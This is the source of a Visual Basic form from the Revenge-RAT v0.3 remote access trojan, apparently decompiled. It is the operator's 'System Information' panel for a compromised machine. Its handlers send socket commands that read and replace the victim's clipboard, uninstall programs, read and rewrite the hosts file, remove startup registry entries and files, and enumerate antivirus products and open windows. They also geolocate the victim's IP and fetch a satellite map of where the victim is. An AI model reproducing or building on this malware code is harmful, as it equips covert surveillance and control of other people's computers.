Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports RevengeRAT.My
Imports RevengeRAT.My.Resources
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports System.Xml
Imports Revenge_RAT_v0._3.RevengeRAT
Imports Revenge_RAT_v0._3.Main

Public Class System_Information
    Public Document As XmlDocument
    Private m_SortingColumn As ColumnHeader
    Public sock As Integer
    Public Valuelah As Integer
    Public Sub New()
        Me.Document = New XmlDocument
        Me.InitializeComponent()
    End Sub

    Private Sub AVRE_Click(sender As Object, e As EventArgs) Handles AVRE.Click
        Me.AVList.Items.Clear()
        Me.AVList.Groups.Clear()
        Me.ToolStripStatusLabel11.Text = "Please wait a moment ..."
        Me.AVRE.Enabled = False
        Me.AVList.Enabled = False
        My.Forms.Main.s.Send(Me.sock, "GAVN")
    End Sub

    Private Sub CAVLIST_Click(sender As Object, e As EventArgs) Handles CAVLIST.Click
        Me.AVList.Items.Clear()
        Me.AVList.Groups.Clear()
        Me.ToolStripStatusLabel11.Text = "Ready to any command!"
        Me.AVRE.Enabled = True
        Me.CAVLIST.Enabled = False
        Me.AVList.Enabled = False
    End Sub

    Private Sub CHostsList_Click(sender As Object, e As EventArgs) Handles CHostsList.Click
        If Me.HostsText.Enabled Then
            Me.HostsText.Text = ""
            Me.HostsText.Enabled = False
            Me.ToolStripStatusLabel2.Text = ".."
        End If
        Me.RHostsList.Enabled = True
        Me.UpdateHost.Enabled = False
        Me.CHostsList.Enabled = False
    End Sub

    Private Sub CL_Click(sender As Object, e As EventArgs) Handles CL.Click
        Me.ListView1.Items.Clear()
        Me.ToolStripStatusLabel2.Text = ".."
        Me.CL.Enabled = False
        Me.RIL.Enabled = True
        Me.ListView1.Enabled = False
    End Sub

    Private Sub CLP_Click(sender As Object, e As EventArgs) Handles CLP.Click
        My.Forms.Main.s.Send(Me.sock, "ClearClipboard")
        Me.Textc.Text = ""
    End Sub

    Private Sub CWL_Click(sender As Object, e As EventArgs) Handles CWL.Click
        Me.RWL.Enabled = True
        Me.CWL.Enabled = False
        Me.WIL.Items.Clear()
        Me.WIL.Enabled = False
        Me.ToolStripStatusLabel9.Text = "Ready to any command!"
    End Sub

    Private Sub DSF_Click(sender As Object, e As EventArgs) Handles DSF.Click
        Dim enumerator As IEnumerator
        Me.ToolStripStatusLabel6.Text = "Please wait a moment ..."
        Try
            enumerator = Me.ListView3.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("DFile" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(0).Text))}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ListView2_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles ListView2.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Private Sub Listview4_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles Listview4.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Private Sub RCL_Click(sender As Object, e As EventArgs) Handles RCL.Click
        My.Forms.Main.s.Send(Me.sock, "GetClipboard")
        Me.ToolStripStatusLabel4.Text = "Please wait a moment ..."
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.ListView2.Items.Clear()
        Me.ListView2.Enabled = False
        My.Forms.Main.s.Send(Me.sock, "GSV")
        Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
        Try
            enumerator = Me.ListView2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("RReg" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(0).Text))}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RFM_Click(sender As Object, e As EventArgs) Handles RFM.Click
        Try
            Me.RFM.Enabled = False
            Me.PM.Image = Nothing
            Me.Document.LoadXml(New WebClient().DownloadString(("http://ip-api.com/xml/" & My.Forms.Main.s.IP(Me.sock))))
            File.WriteAllBytes((Path.GetTempPath & "Revenge-Clients-Map.jpg"), New WebClient().DownloadData(String.Format(String.Concat(New String() {"http://maps.google.com/maps/api/staticmap?center=", Me.GDESN("lat"), ",", Me.GDESN("lon"), "&zoom=", Conversions.ToString(2), "&markers=color:red|", Me.GDESN("lat"), ",", Me.GDESN("lon"), "&size=", Conversions.ToString(Me.Size.Width), "x", Conversions.ToString(Me.Size.Height), "&maptype=satellite&sensor=false"}), New Object(0 - 1) {})))
            Me.PM.ImageLocation = (Path.GetTempPath & "Revenge-Clients-Map.jpg")
            Try
                Me.ListView5.Items.Item(0).SubItems.Item(1).Text = Me.GDESN("country")
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.ListView5.Items.Item(0).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(1).SubItems.Item(1).Text = Me.GDESN("countryCode")
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                Me.ListView5.Items.Item(1).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(2).SubItems.Item(1).Text = Me.GDESN("region")
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Me.ListView5.Items.Item(2).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(3).SubItems.Item(1).Text = Me.GDESN("regionName")
            Catch exception4 As Exception
                ProjectData.SetProjectError(exception4)
                Me.ListView5.Items.Item(3).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(4).SubItems.Item(1).Text = Me.GDESN("city")
            Catch exception5 As Exception
                ProjectData.SetProjectError(exception5)
                Me.ListView5.Items.Item(4).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(4).SubItems.Item(1).Text = Me.GDESN("city")
            Catch exception6 As Exception
                ProjectData.SetProjectError(exception6)
                Me.ListView5.Items.Item(4).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(5).SubItems.Item(1).Text = Me.GDESN("lat")
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Me.ListView5.Items.Item(5).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(6).SubItems.Item(1).Text = Me.GDESN("lon")
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Me.ListView5.Items.Item(6).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(7).SubItems.Item(1).Text = Me.GDESN("timezone")
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Me.ListView5.Items.Item(7).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
            Try
                Me.ListView5.Items.Item(8).SubItems.Item(1).Text = My.Forms.Main.s.IP(Me.sock)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Me.ListView5.Items.Item(8).SubItems.Item(1).Text = "????"
                ProjectData.ClearProjectError()
            End Try
        Catch exception11 As Exception
            ProjectData.SetProjectError(exception11)
            Dim exception As Exception = exception11
            MessageBox.Show(exception.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            ProjectData.ClearProjectError()
        End Try
        Me.RFM.Enabled = True
        Me.PM.Refresh()
    End Sub

    Private Sub RHostsList_Click(sender As Object, e As EventArgs) Handles RHostsList.Click
        If Me.HostsText.Enabled Then
            Me.HostsText.Text = ""
            Me.HostsText.Enabled = False
        End If
        My.Forms.Main.s.Send(Me.sock, "ReadHostsFile")
        Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
        Me.RHostsList.Enabled = False
        Me.CHostsList.Enabled = False
        Me.UpdateHost.Enabled = False
    End Sub

    Private Sub RIL_Click(sender As Object, e As EventArgs) Handles RIL.Click
        Me.ListView1.Items.Clear()
        Me.ToolStripStatusLabel2.Text = "Please wait a moment ..."
        My.Forms.Main.s.Send(Me.sock, "System Detils")
        Me.RIL.Enabled = False
    End Sub

    Private Sub System_Information_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ListView1.GridLines = My.Forms.Main.Listview1.GridLines
        Me.ListView5.GridLines = My.Forms.Main.Listview1.GridLines
        Me.WIL.GridLines = My.Forms.Main.Listview1.GridLines
        Me.Listview4.GridLines = My.Forms.Main.Listview1.GridLines
        Me.ListView2.GridLines = My.Forms.Main.Listview1.GridLines
        Me.ListView3.GridLines = My.Forms.Main.Listview1.GridLines
    End Sub

    Public Function GDESN(ByVal input As String) As String
        Return Me.Document.DocumentElement.SelectSingleNode(input).InnerText
    End Function

    Private Sub RP_Click(sender As Object, e As EventArgs) Handles RP.Click
        Me.Listview4.Enabled = False
        Me.Listview4.Items.Clear()
        My.Forms.Main.s.Send(Me.sock, ("Getinstalledprograms" & My.Forms.Main.Key))
        Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
    End Sub

    Private Sub RStartupPath_Click(sender As Object, e As EventArgs) Handles RStartupPath.Click
        Me.ListView3.Items.Clear()
        Me.ListView3.Enabled = False
        My.Forms.Main.s.Send(Me.sock, "GetStartupFiles")
        Me.ToolStripStatusLabel6.Text = "Please wait a moment ..."
    End Sub

    Private Sub RWL_Click(sender As Object, e As EventArgs) Handles RWL.Click
        Me.RWL.Enabled = False
        My.Forms.Main.s.Send(Me.sock, "GWL")
        Me.ToolStripStatusLabel9.Text = "Please wait a moment ..."
        Me.CWL.Enabled = True
    End Sub

    Private Sub SetClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetClipboardToolStripMenuItem.Click
        Dim input As String = Interaction.InputBox("Enter the text you want set in clipboard!", "", "Revenge", -1, -1)
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("SetClipboard" & My.Forms.Main.Key), SocketServer.Encode(input))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
        My.Forms.Main.s.Send(Me.sock, "GetClipboard")
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Listview4.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Uninstall" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(4).Text))}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub UpdateHost_Click(sender As Object, e As EventArgs) Handles UpdateHost.Click
        If Me.HostsText.Enabled Then
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("UpdateHostFile" & My.Forms.Main.Key), SocketServer.Encode(Me.HostsText.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
        End If
    End Sub

    Private Sub WIL_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles WIL.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub
End Class